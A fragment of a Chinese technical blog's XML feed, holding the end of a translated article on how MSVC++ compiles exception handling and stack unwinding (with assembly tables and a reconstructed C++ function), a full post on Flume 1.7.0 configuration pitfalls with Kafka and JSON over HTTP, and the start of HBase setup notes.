class="built_in">dd</span> offset func1_trymap  <span class="comment">; pTryBlockMap</span></div><div class="line">    <span class="built_in">dd</span> <span class="number">0</span>                    <span class="comment">; nIPMapEntries</span></div><div class="line">    <span class="built_in">dd</span> <span class="number">0</span>                    <span class="comment">; pIPtoStateMap</span></div><div class="line">    <span class="built_in">dd</span> <span class="number">0</span>                    <span class="comment">; pESTypeList</span></div><div class="line"></div><div class="line">func1_unwindmap</div><div class="line">    <span class="built_in">dd</span> -<span class="number">1</span></div><div class="line">    <span class="built_in">dd</span> offset func1_unwind_1tobase <span class="comment">; action</span></div><div class="line">    <span class="built_in">dd</span> <span class="number">0</span>                    <span class="comment">; toState</span></div><div class="line">    <span class="built_in">dd</span> <span class="number">0</span>                    <span class="comment">; action</span></div><div class="line">    <span class="built_in">dd</span> <span class="number">1</span>                    <span class="comment">; toState</span></div><div class="line">    <span class="built_in">dd</span> offset func1_unwind_2to1 <span class="comment">; action</span></div><div class="line">    <span class="built_in">dd</span> <span class="number">0</span>                    <span class="comment">; toState</span></div><div class="line">    <span class="built_in">dd</span> <span class="number">0</span>                    <span class="comment">; action</span></div><div class="line"></div><div class="line">func1_trymap</div><div class="line">    <span class="built_in">dd</span> <span class="number">1</span>                    <span class="comment">; tryLow</span></div><div class="line">    <span class="built_in">dd</span> <span class="number">2</span>                    <span class="comment">; tryHigh</span></div><div class="line">    <span class="built_in">dd</span> <span class="number">3</span>                    <span class="comment">; catchHigh</span></div><div class="line">    <span class="built_in">dd</span> <span class="number">2</span>                    <span class="comment">; nCatches</span></div><div class="line">    <span class="built_in">dd</span> offset func1_tryhandlers_0 <span class="comment">; pHandlerArray</span></div><div class="line">    <span class="built_in">dd</span> <span class="number">0</span></div><div class="line"></div><div class="line">func1_tryhandlers_0</div><div class="line">    <span class="built_in">dd</span> <span class="number">0</span>                    <span class="comment">; adjectives</span></div><div class="line">    <span class="built_in">dd</span> offset char * <span class="string">'RTTI Type Descriptor'</span> <span class="comment">; pType</span></div><div class="line">    <span class="built_in">dd</span> -<span class="number">1Ch</span>                 <span class="comment">; dispCatchObj</span></div><div class="line">    <span class="built_in">dd</span> offset func1_try0handler_pchar <span class="comment">; addressOfHandler</span></div><div class="line">    <span class="built_in">dd</span> <span class="number">0</span>                    <span class="comment">; adjectives</span></div><div class="line">    <span class="built_in">dd</span> <span class="number">0</span>                    <span class="comment">; pType</span></div><div class="line">    <span class="built_in">dd</span> <span class="number">0</span>                    <span class="comment">; dispCatchObj</span></div><div class="line">    <span class="built_in">dd</span> offset func1_try0handler_ellipsis <span class="comment">; addressOfHandler</span></div><div class="line"></div><div class="line">func1_unwind_1tobase proc <span class="built_in">near</span></div><div class="line">    a1 = <span class="built_in">byte</span> <span class="built_in">ptr</span> -<span class="number">14h</span></div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+a1]</div><div class="line">    <span class="keyword">call</span>    A::~A(void)</div><div class="line">    <span class="keyword">retn</span></div><div class="line">func1_unwind_1tobase endp</div><div class="line"></div><div class="line">func1_unwind_2to1 proc <span class="built_in">near</span></div><div class="line">    a2 = <span class="built_in">byte</span> <span class="built_in">ptr</span> -<span class="number">18h</span></div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+a2]</div><div class="line">    <span class="keyword">call</span>    A::~A(void)</div><div class="line">    <span class="keyword">retn</span></div><div class="line">func1_unwind_2to1 endp</div></pre></td></tr></table></figure>
<p>我们来看上述程序示例，<code>FuncInfo</code> 结构体中的 <code>maxState</code> 域值为 <code>4</code>，这表明<strong>栈展开映射表</strong>中有 <code>4</code> 个入口点，编号 <strong>0-3</strong> 。检查映射表，可以看到在栈展开过程中会执行的相应动作有以下 <code>4</code> 个：</p>
<blockquote>
<ul>
<li>state 3 -&gt; state 0 (NOP)</li>
<li>state 2 -&gt; state 1 (析构 <code>a2</code> )</li>
<li>state 1 -&gt; state 0 (NOP)</li>
<li>state 0 -&gt; state -1 (析构 <code>a1</code> )</li>
</ul>
</blockquote>
<p>再看 <code>try</code> 语句映射表，我们可以推断， <code>state 1</code> 和 <code>state2</code> 对应 <code>try</code> 语句块的执行逻辑，而 <code>sttate3</code> 对应 <code>catch</code> 语句块的执行逻辑。这样一来，<code>state 0 -&gt; 1</code> 的变化代表了 <code>try</code> 语句块的<strong>开始</strong>，<code>state 1 - &gt;0</code> 代表 <code>try</code> 语句块的<strong>结束</strong>。另外，我们还可以推断 <code>state -1 --&gt; 0</code> 代表创建 <code>a1</code>；<code>state 1 -&gt; 2</code> 代表创建 <code>a2</code>。具体的状态装换和相应的程序执行逻辑如下图所示：<br><img src="/imgs/14932976893461.gif" alt=""><br>看到这里可能会心生疑惑：<code>1 -&gt; 3</code> 那个箭头是从哪儿来的？其实这是在异常处理句柄内部发生的，我们从<strong>函数代码</strong>和 <code>FuncInfo</code> 结构体中都看不出来罢了。如果一个异常在 <code>try</code> 块内部被触发，异常处理句柄在调用相应的 <code>catch</code> 块之前，首先要做的就是把栈展开到 <code>tryLow</code> 那一层（上面例子中的 <code>state 1</code>），然后把状态值 <code>state</code> 设置为 <code>tryHigh+1</code>（即 <code>2+1=3</code>）。</p>
<p><code>try</code> 语句块对应 2 个 <code>catch</code> 句柄。第一个有一个 <code>catch</code> 的类型（ <code>char*</code> ），并且在栈 <code>-1Ch</code> 处获取到异常对象。第二个没有对应的异常类型，什么也不做，相当于忽略异常。两个句柄都会返回函数继续执行的地址，这个地址其实就紧随 <code>try</code> 块之后。这样我们试着还原一下该函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">func1</span> <span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    A a1;</div><div class="line">    a1.m1 = <span class="number">1</span>;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        A a2;</div><div class="line">        a2.m1 = <span class="number">2</span>;</div><div class="line">        <span class="keyword">if</span> (a1.m1 == a1.m2) <span class="keyword">throw</span> <span class="string">"abc"</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">catch</span>(<span class="keyword">char</span>* e)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Caught %s\n"</span>,e);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">catch</span>(...)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Caught ...\n"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"after try\n"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="附录-3-IDC-辅助脚本"><a href="#附录-3-IDC-辅助脚本" class="headerlink" title="附录 3: IDC 辅助脚本"></a>附录 3: IDC 辅助脚本</h2><p>我编写了一个 IDC 脚本用来辅助对 MSVC 程序的逆向分析。它会在整个程序中搜索 SEH/EH 的代码段，并且为所有相关的结构体和结构体元素添加注释。可以被注释的项有<strong>栈变量</strong>、<strong>异常处理句柄</strong>、<strong>异常类型</strong>及其他相关元素。它还能尝试修复 IDA 中误判的函数边界。该脚本的下载链接： <a href="http://www.openrce.org/downloads/details/196" target="_blank" rel="external">MS SEH/EH 逆向辅助脚本</a> 。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><h3 id="原文参考资料："><a href="#原文参考资料：" class="headerlink" title="原文参考资料："></a>原文参考资料：</h3><ol>
<li><a href="http://www.microsoft.com/msj/0197/exception/exception.aspx" target="_blank" rel="external">http://www.microsoft.com/msj/0197/exception/exception.aspx</a></li>
<li><a href="http://blogs.msdn.com/branbray/archive/2003/11/11/51012.aspx" target="_blank" rel="external">http://blogs.msdn.com/branbray/archive/2003/11/11/51012.aspx</a></li>
<li><a href="http://blogs.msdn.com/cbrumme/archive/2003/10/01/51524.aspx" target="_blank" rel="external">http://blogs.msdn.com/cbrumme/archive/2003/10/01/51524.aspx</a></li>
<li><a href="http://www.codeproject.com/cpp/exceptionhandler.asp" target="_blank" rel="external">http://www.codeproject.com/cpp/exceptionhandler.asp</a></li>
<li><a href="http://www.cs.arizona.edu/computer.help/policy/DIGITAL_unix/AA-PY8AC-TET1_html/callCH5.html" target="_blank" rel="external">http://www.cs.arizona.edu/computer.help/policy/DIGITAL_unix/AA-PY8AC-TET1_html/callCH5.html</a></li>
</ol>
<h3 id="翻译参考资料"><a href="#翻译参考资料" class="headerlink" title="翻译参考资料"></a>翻译参考资料</h3><ol>
<li><a href="http://www.cnblogs.com/samo/articles/3092895.html" target="_blank" rel="external">http://www.cnblogs.com/samo/articles/3092895.html</a></li>
<li><a href="http://www.cnblogs.com/Winston/archive/2009/04/19/1439184.html" target="_blank" rel="external">http://www.cnblogs.com/Winston/archive/2009/04/19/1439184.html</a></li>
<li><a href="https://msdn.microsoft.com/en-us/library/8dbf701c(v=vs.80).aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/8dbf701c(v=vs.80).aspx</a></li>
<li><a href="http://www.nynaeve.net/?p=91" target="_blank" rel="external">http://www.nynaeve.net/?p=91</a></li>
<li><a href="http://www.cnblogs.com/awpatp/archive/2009/11/04/1595988.html" target="_blank" rel="external">http://www.cnblogs.com/awpatp/archive/2009/11/04/1595988.html</a></li>
<li><a href="https://en.wikibooks.org/wiki/C%2B%2B_Programming/RTTI" target="_blank" rel="external">https://en.wikibooks.org/wiki/C%2B%2B_Programming/RTTI</a></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;原文： &lt;a href=&quot;http://www.openrce.org/articles/full_view/21&quot;&gt;http://www.openrce.org/articles/full_view/21&lt;/a&gt;  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;摘要&quot;&gt;&lt;a href=&quot;#摘要&quot; class=&quot;headerlink&quot; title=&quot;摘要&quot;&gt;&lt;/a&gt;摘要&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;MSVC++&lt;/strong&gt; 是编写 Win32 应用程序最常用的编译器，所以在 Win32 平台的逆向工作中，懂得其底层工作原理，对逆向工程师来说至关重要。掌握 VC++ 程序的底层原理之后，便能在逆向过程中精准、快速识别编译器生成的&lt;strong&gt;胶水代码&lt;/strong&gt;（Glue Code），这样可以让逆向工程师快速聚焦于二进制文件背后的真实程序和真实逻辑。另外，这对还原程序中高层次的结构（&lt;strong&gt;&lt;code&gt;译注&lt;/code&gt;&lt;/strong&gt;：面向对象的数据结构和程序组织结构、异常相关数据结构等）也有莫大帮助。  &lt;/p&gt;
&lt;p&gt;本文只是系列文章的上半部分（下半部分见： &lt;a href=&quot;http://jiayu0x.com/2017/04/30/reversing-msvcxx-exception-handling-2/&quot;&gt;(译)MSVC++ 逆向（二）—— 类、方法和 RTTI&lt;/a&gt;），主要讲栈展开、异常处理以及 MSVC 编译生成相关的数据结构。阅读本文需要有汇编、寄存器和调用约定相关的知识储备，当然，MSVC++ 的编程基础知识也是必要的。  &lt;/p&gt;
    
    </summary>
    
      <category term="security" scheme="http://jiayu0x.com/categories/security/"/>
    
    
      <category term="security" scheme="http://jiayu0x.com/tags/security/"/>
    
      <category term="re" scheme="http://jiayu0x.com/tags/re/"/>
    
      <category term="c++" scheme="http://jiayu0x.com/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>Flume 踩坑排雷记</title>
    <link href="http://jiayu0x.com/2016/12/27/flume-summary/"/>
    <id>http://jiayu0x.com/2016/12/27/flume-summary/</id>
    <published>2016-12-26T16:00:00.000Z</published>
    <updated>2017-05-04T13:48:22.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-背景"><a href="#1-背景" class="headerlink" title="1. 背景"></a>1. 背景</h2><p>最近一段时间在做安全大数据分析环境搭建以及初步的数据采集、录入工作，这个过程中用到了 <code>Hadoop+HBase+Flume+Kafka</code>这套大数据分析的工具。在数据分析环境架构中，<code>Flume-1.7.0</code> 主要用来收集各种来源、形式的数据，并把数据传给 <code>Kafka</code> 集群，由 <code>Kafka</code> 集群统一分发给 <code>HBase</code> 集群。</p>
<p>用 <code>Flume</code> ，主要用到的 <strong><code>Source</code></strong> 是 <code>spooldir source</code> 和 <code>http-json source</code>，<strong><code>Sink</code></strong> 就主要是 <code>Kafka Sink</code>，配置非常灵活、功能也很强大。但在使用的过程中踩了不少坑，撰文记录一下比较重要的几个。</p>
<blockquote>
<p><strong>NOTE:</strong><br><code>Flume-ng</code> 的<code>Agent</code> 由三部分组成：<code>Source</code>/<code>Channel</code>/<code>Sink</code>，<code>Source</code> 相当于数据录入源，是 <strong>生产者</strong> 的角色； <code>Channel</code> 相当于数据传输通道；<code>Sink</code> 相当于数据接收端，是<strong>消费者</strong>的角色。在 <code>Flume-ng</code> 中，数据流向是 <code>Source--&gt;Channel--&gt;Sink</code>。</p>
</blockquote>
<h2 id="2-kafka-Sink-配置坑"><a href="#2-kafka-Sink-配置坑" class="headerlink" title="2. kafka Sink 配置坑"></a>2. <code>kafka</code> Sink 配置坑</h2><h3 id="2-1-LEADER-NOT-AVAILABLE-Error"><a href="#2-1-LEADER-NOT-AVAILABLE-Error" class="headerlink" title="2.1 LEADER_NOT_AVAILABLE Error"></a>2.1 <code>LEADER_NOT_AVAILABLE</code> Error</h3><a id="more"></a>
<p><code>Kafka Sink</code> ，顾名思义，即把 <code>Kafka</code> （集群或单个服务器）当做 <code>Flume</code> 的数据接收端（消费者），其中有一个配置项是配置 <code>Kafka</code> 的服务器：<br><figure class="highlight roboconf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">AGENT_NAME.sinks.malwrK.kafka.bootstrap.servers = serv1:PORT[,serv2:PORT,serv3:PORT...]</div></pre></td></tr></table></figure></p>
<p>这项配置中，如果只指定单个的 <code>Kafka</code> 服务器地址，<code>Flume Agent</code> 会正常运行，但如果把 <code>Kafka</code> 集群里的多个服务器地址都写上，并且<code>Kafka</code>的默认配置不修改，则会报以下错误：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">WARN Error while fetching metadata with correlation id 39 : &#123;4-3-16-topic1=LEADER_NOT_AVAILABLE&#125;</div></pre></td></tr></table></figure></p>
<p>并且数据无法正常发送到 <code>Kafka</code> 集群。该错误的意思是集群中的服务器，没有一个可用的 <strong>LEADER</strong>，导致数据无法正常 Fetch。那么解决方法也很简单，在 <code>Kafka</code> 集群的每个服务器 <code>server.properties</code> 配置文件中，开启（取消注释）以下配置，并把配置项的值改成统一指定的一台 <code>Kafka</code> 服务器做 <strong>LEADER</strong>：<br><figure class="highlight roboconf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">advertised.listeners=PLAINTEXT://your.host.name:9092</div></pre></td></tr></table></figure></p>
<h3 id="2-2-useFlumeEventFormat-导致的-Flume-Event-Headers-乱码"><a href="#2-2-useFlumeEventFormat-导致的-Flume-Event-Headers-乱码" class="headerlink" title="2.2 useFlumeEventFormat 导致的 Flume Event Headers 乱码"></a>2.2 <code>useFlumeEventFormat</code> 导致的 Flume Event Headers 乱码</h3><p><code>Kafka Sink</code> 中有这么一个配置项 <code>useFlumeEventFormat</code>，此配置默认关闭，官方解释如下；</p>
<blockquote>
<p>By default events are put as bytes onto the Kafka topic directly from the event body. Set to true to store events as the Flume Avro binary format. Used in conjunction with the same property on the KafkaSource or with the parseAsFlumeEvent property on the Kafka Channel this will preserve any Flume headers for the producing side.</p>
</blockquote>
<p>如果设置此项为 <code>true</code>，<code>Kafka Sink</code> 则会把数据按照标准的 Flume Event 格式（即<code>Headers</code>域和<code>body</code>域结合的数据结构）发送。Flume Event 中的 <code>Headers</code> 域通常是一些附加字段，可以是时间戳（比如时间戳拦截器指定的时间戳）、文件名（比如 <code>spooldir</code> Source 开启的 <code>fileHeader = true</code>）等信息。但是 <code>1.7.0</code> 版本的 Flume 一旦开启此配置，会导致 <code>Headers</code> 域里面的信息乱码，如下图所示：<br><img src="/imgs/1482809681554.png" alt="Alt text"></p>
<p>这可能是这个版本 Flume 的一个 Bug，原因未明，查各种资料也没查到，就剩翻源码了……</p>
<h2 id="3-spooldir-Source-的配置技巧"><a href="#3-spooldir-Source-的配置技巧" class="headerlink" title="3. spooldir Source 的配置技巧"></a>3. <code>spooldir</code> Source 的配置技巧</h2><p><code>spooldir</code> Source 的作用，是监控一个特定目录下的文件，一旦有新文件放入这个特定的目录，Flume 的 Agent 就会把整个文件的内容 <strong>逐行</strong> 读取，通过指定的 <code>Channel</code> 发送到指定的 <code>Sink</code>，并把已处理过的文件默认以<code>.COMPLETED</code> 后缀标记为已处理，或者直接删除。</p>
<p>早期版本的 Flume 中， <code>spooldir</code> Source 监控指定目录时，是不能监控子目录的，但我们用的 <code>1.7.0</code> 版本，提供了一个配置项可以监控指定目录下的子目录：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">recursiveDirectorySearch = true</div></pre></td></tr></table></figure></p>
<p><code>spooldir</code> Source 的默认配置，用来监控一个目录下的同类型文件足够了，但是我们的需求有点复杂：首先，我们这个监控目录下的文件不是同一类型（尽管文件的内容结构类似，比如都是 IP 库，每行一个 IP）；其次，我们的文件是一次性下载的，不是逐行写入的；最后，我们需要在逐行传输每个文件的时候，携带上文件所述的类型、文件生成的时间标记。</p>
<p>这个需求有两种处理方法：</p>
<ol>
<li>每次下载一个文件，就用脚本自动化处理一下，把文件类型和时间戳加入文件的每一行中；</li>
<li>寄希望与 Flume，看 Flume 传输数据的时候能不能对数据进行一些自定义的修改——不修改本地文件，只在 Flume 传输文件的过程中修改一下。</li>
</ol>
<p>无疑第一个工作量不小，而且比较耗费计算资源。去翻了下 Flume 的 用户手册 <code>spooldir</code> Source 部分，发现有一个配置项可以方便我们选第2中方法达成目标：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">fileHeader = true</div><div class="line"># 或者</div><div class="line">basenameHeader = true</div></pre></td></tr></table></figure></p>
<p>开启 <code>fileHeader</code> 会在 Flume 传输数据的时候，把数据所属文件的绝对路径附在每一行数据之前；开启 <code>basenameHeader</code> 会在 Flume 传输数据的时候，把数据所属文件的文件名附在每一行数据之前。</p>
<p>这样，我们把数据文件的文件名修改为 <code>type-timestamp-</code>的形式即可。比如我们生成一个名为 <code>bambenek_c2-1478553609-</code> 的文件，该文件里有数万行IP数据，那么 Flume 传输该数据的形式如下图所示：<br><img src="/imgs/1482235249267.png" alt="Alt text"></p>
<p>这样就满足了我们的需求，后台接收到数据之后，只需用 <strong><code>-</code></strong> 字符把每行数据 Split 成 3 个部分（文件名、时间戳、数据内容）即可。</p>
<blockquote>
<p><strong>NOTE:</strong><br>其实，Flume 中还有功能更强大的 <code>Interceptors</code>（拦截器），可以对其处理的数据进行更细粒度、方式更灵活的修改。参考 <a href="https://flume.apache.org/FlumeUserGuide.html#flume-interceptors" target="_blank" rel="external">Flume Interceptors</a></p>
</blockquote>
<h2 id="4-http-Source-的坑"><a href="#4-http-Source-的坑" class="headerlink" title="4.http Source 的坑"></a>4.<code>http</code> Source 的坑</h2><p>这是最大的一个坑，不过踩的有点冤，如果把官方用户手册看仔细，并对 JSON 的数据格式有准确的理解，应该就不会掉坑了。</p>
<p>Flume 的 <code>http</code> Source，默认数据源的形式是接收第三方用 HTTP POST 方法发送过来的 JSON 格式的数据（默认的 Source 处理类 <code>JSONHandler</code> ，也可以自定义实现其他的数据处理类）。比如我们的应用场景，从网上抓取的威胁情报信息，Python 写的爬虫程序处理好之后，不用存库，直接整理成 JSON 格式，然后 POST 给 Flume 的 Agent 即可。</p>
<p>但是，Flume 的 <code>http</code> Source 对这种方式的 JSON 数据格式有严格的要求，如果 JSON 数据格式不符合要求，POST 过去数据就会发现服务端报错，如下图红框里的 JSON 数据，完全符合 JSON 数据格式规范，但 POST 请求发送之后就会收到 <code>Request has invalid JSON Syntax.</code> 的错误提示：<br><img src="/imgs/1482235307436.png" alt="Alt text"></p>
<p>原因是什么？扒一下 Flume 的官方用户手册（<a href="https://flume.apache.org/FlumeUserGuide.html#jsonhandler" target="_blank" rel="external">http source–&gt; JSONHandler</a>）看一下：</p>
<blockquote>
<p>A handler is provided out of the box which can handle <strong>events represented in JSON format</strong>, and supports UTF-8, UTF-16 and UTF-32 character sets. The handler accepts an <strong>array of events</strong> (even if there is only one event, the event has to be sent in an array) and converts them to a Flume event based on the encoding specified in the request. If no encoding is specified, UTF-8 is assumed</p>
</blockquote>
<p>注意加粗部分，意思是该类（<code>JSONHandler</code>）处理的是 JSON 格式的 Flume Event<strong>s</strong>（可以一次传输多个 <code>Flume Events</code>，即多组数据记录），接收的 JSON 数据必须是 <strong>array of events</strong>，即使只发送一个 <code>Flume Event</code>，也得按照 JSON Array 的格式发送。</p>
<p>什么意思？这里还要插播一下 JSON 数据格式规范。JSON 的数据格式里，基本元素是 <strong>值</strong> 或者 <strong>键值对</strong>，JSON 数据的值可以是以下几种：</p>
<ul>
<li>数字（<code>bunber</code>，整数或浮点数）</li>
<li>字符串（<code>string</code>，在双引号中）</li>
<li>逻辑值（<code>bool</code>，true 或 false）</li>
<li>对象（<code>object</code>，在花括号中，比如<code>{&quot;k1&quot;:&quot;v1&quot;,&quot;k2&quot;:&quot;v2&quot;}</code>）</li>
<li>数组（<code>array</code>，在方括号中，比如<code>[{&quot;k1&quot;:&quot;v1&quot;,},{&quot;k2&quot;:int_v2,&quot;k3&quot;:&quot;v3&quot;}]</code>）</li>
<li>null</li>
</ul>
<p>并且官方给出了 JSON 示例：<br><figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">[&#123;</div><div class="line">    <span class="attr">"headers"</span> : &#123;</div><div class="line">        <span class="attr">"timestamp"</span> : <span class="string">"434324343"</span>,</div><div class="line">        <span class="attr">"host"</span> : <span class="string">"random_host.example.com"</span></div><div class="line">    &#125;,</div><div class="line">    <span class="attr">"body"</span> : <span class="string">"random_body"</span></div><div class="line"> &#125;,</div><div class="line"> &#123;</div><div class="line">    <span class="attr">"headers"</span> : &#123;</div><div class="line">        <span class="attr">"namenode"</span> : <span class="string">"namenode.example.com"</span>,</div><div class="line">        <span class="attr">"datanode"</span> : <span class="string">"random_datanode.example.com"</span></div><div class="line">    &#125;,</div><div class="line">    <span class="attr">"body"</span> : <span class="string">"really_random_body"</span></div><div class="line"> &#125;]</div></pre></td></tr></table></figure></p>
<p>但 Flume 官方手册没说明的是，Flume 的 Event 只有两部分组成：<strong>headers</strong> 和 <strong>body</strong>，所以传输的 JSON Array 里的 Flume Event，每个 Event 也只可以包括 <strong>headers</strong> 和 <strong>body</strong> 两部分，而且 <strong><code>headers</code>的值是 <code>JSON 对象（object）</code>，而<code>body</code>的值只能是 <code>JSON 字符串（string）</code>，不能是其他 JSON 值类型</strong>，比如下图所示的 JSON 形式，对 Flume 来说算是合法的<br><img src="/imgs/1482235288060.png" alt="Alt text"></p>
<p>另外，为了方便 Python 编程，附上 Python 中的 <code>json</code> 库里，Python 数据类型跟 JSON 值类型的对应关系表（参考： <a href="https://docs.python.org/2/library/json.html#json.JSONEncoder" target="_blank" rel="external">Python json.JSONEncoder()</a>）：<br><img src="/imgs/1482245906334.png" alt="Alt text"></p>
<p>最后总结一下，传给 flume HTTP Source 的 JSON 数据：</p>
<ol>
<li>必须是 Array 形式（用方括号括起来），即使 Array 里只有 1 个元素（每个元素到了 Flume 那儿就代表一个 Event），在 Python 里就要用 <code>dict</code> 外面嵌套 <code>list</code> 或者 <code>tuple</code> 生成 JSON Array；</li>
<li>JSON Array 里每个元素必须由 <code>headers</code> 和 <code>body</code> 两个 field 构成;</li>
<li>JSON Array 中元素的 <code>headers</code> 的值是 <code>JSON Object</code>(具体可以自定义)，<code>body</code> 的值必须是字串（JSON String），而不能是其他形式（JSON <code>Object/JSON Array</code>等，对应 Python 中的 <code>dict/list/tuple</code> 等）。</li>
</ol>
<h2 id="5-参考资料："><a href="#5-参考资料：" class="headerlink" title="5. 参考资料："></a>5. 参考资料：</h2><ol>
<li><a href="http://stackoverflow.com/questions/35788697/leader-not-available-kafka-in-console-producer" target="_blank" rel="external">http://stackoverflow.com/questions/35788697/leader-not-available-kafka-in-console-producer</a></li>
<li><a href="https://flume.apache.org/FlumeUserGuide.html" target="_blank" rel="external">https://flume.apache.org/FlumeUserGuide.html</a></li>
<li><a href="https://docs.python.org/2/library/json.html" target="_blank" rel="external">https://docs.python.org/2/library/json.html</a></li>
<li><a href="https://docs.python.org/2/library/json.html#py-to-json-table" target="_blank" rel="external">https://docs.python.org/2/library/json.html#py-to-json-table</a></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1-背景&quot;&gt;&lt;a href=&quot;#1-背景&quot; class=&quot;headerlink&quot; title=&quot;1. 背景&quot;&gt;&lt;/a&gt;1. 背景&lt;/h2&gt;&lt;p&gt;最近一段时间在做安全大数据分析环境搭建以及初步的数据采集、录入工作，这个过程中用到了 &lt;code&gt;Hadoop+HBase+Flume+Kafka&lt;/code&gt;这套大数据分析的工具。在数据分析环境架构中，&lt;code&gt;Flume-1.7.0&lt;/code&gt; 主要用来收集各种来源、形式的数据，并把数据传给 &lt;code&gt;Kafka&lt;/code&gt; 集群，由 &lt;code&gt;Kafka&lt;/code&gt; 集群统一分发给 &lt;code&gt;HBase&lt;/code&gt; 集群。&lt;/p&gt;
&lt;p&gt;用 &lt;code&gt;Flume&lt;/code&gt; ，主要用到的 &lt;strong&gt;&lt;code&gt;Source&lt;/code&gt;&lt;/strong&gt; 是 &lt;code&gt;spooldir source&lt;/code&gt; 和 &lt;code&gt;http-json source&lt;/code&gt;，&lt;strong&gt;&lt;code&gt;Sink&lt;/code&gt;&lt;/strong&gt; 就主要是 &lt;code&gt;Kafka Sink&lt;/code&gt;，配置非常灵活、功能也很强大。但在使用的过程中踩了不少坑，撰文记录一下比较重要的几个。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt;&lt;br&gt;&lt;code&gt;Flume-ng&lt;/code&gt; 的&lt;code&gt;Agent&lt;/code&gt; 由三部分组成：&lt;code&gt;Source&lt;/code&gt;/&lt;code&gt;Channel&lt;/code&gt;/&lt;code&gt;Sink&lt;/code&gt;，&lt;code&gt;Source&lt;/code&gt; 相当于数据录入源，是 &lt;strong&gt;生产者&lt;/strong&gt; 的角色； &lt;code&gt;Channel&lt;/code&gt; 相当于数据传输通道；&lt;code&gt;Sink&lt;/code&gt; 相当于数据接收端，是&lt;strong&gt;消费者&lt;/strong&gt;的角色。在 &lt;code&gt;Flume-ng&lt;/code&gt; 中，数据流向是 &lt;code&gt;Source--&amp;gt;Channel--&amp;gt;Sink&lt;/code&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;2-kafka-Sink-配置坑&quot;&gt;&lt;a href=&quot;#2-kafka-Sink-配置坑&quot; class=&quot;headerlink&quot; title=&quot;2. kafka Sink 配置坑&quot;&gt;&lt;/a&gt;2. &lt;code&gt;kafka&lt;/code&gt; Sink 配置坑&lt;/h2&gt;&lt;h3 id=&quot;2-1-LEADER-NOT-AVAILABLE-Error&quot;&gt;&lt;a href=&quot;#2-1-LEADER-NOT-AVAILABLE-Error&quot; class=&quot;headerlink&quot; title=&quot;2.1 LEADER_NOT_AVAILABLE Error&quot;&gt;&lt;/a&gt;2.1 &lt;code&gt;LEADER_NOT_AVAILABLE&lt;/code&gt; Error&lt;/h3&gt;
    
    </summary>
    
      <category term="bigdata" scheme="http://jiayu0x.com/categories/bigdata/"/>
    
    
      <category term="flume" scheme="http://jiayu0x.com/tags/flume/"/>
    
      <category term="bigdata" scheme="http://jiayu0x.com/tags/bigdata/"/>
    
  </entry>
  
  <entry>
    <title>HBase 一些需要注意的点</title>
    <link href="http://jiayu0x.com/2016/11/21/hbase-notice/"/>
    <id>http://jiayu0x.com/2016/11/21/hbase-notice/</id>
    <published>2016-11-20T16:00:00.000Z</published>
    <updated>2017-04-03T15:20:22.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="同时打开的文件和进程数量限制-ulimit"><a href="#同时打开的文件和进程数量限制-ulimit" class="headerlink" title="同时打开的文件和进程数量限制 (ulimit)"></a>同时打开的文件和进程数量限制 (ulimit)</h3><blockquote>
<p><strong>参考</strong>:<br><a href="http://hbase.apache.org/book.html#basic.prerequisites" target="_blank" rel="external">http://hbase.apache.org/book.html#basic.prerequisites</a></p>
</blockquote>
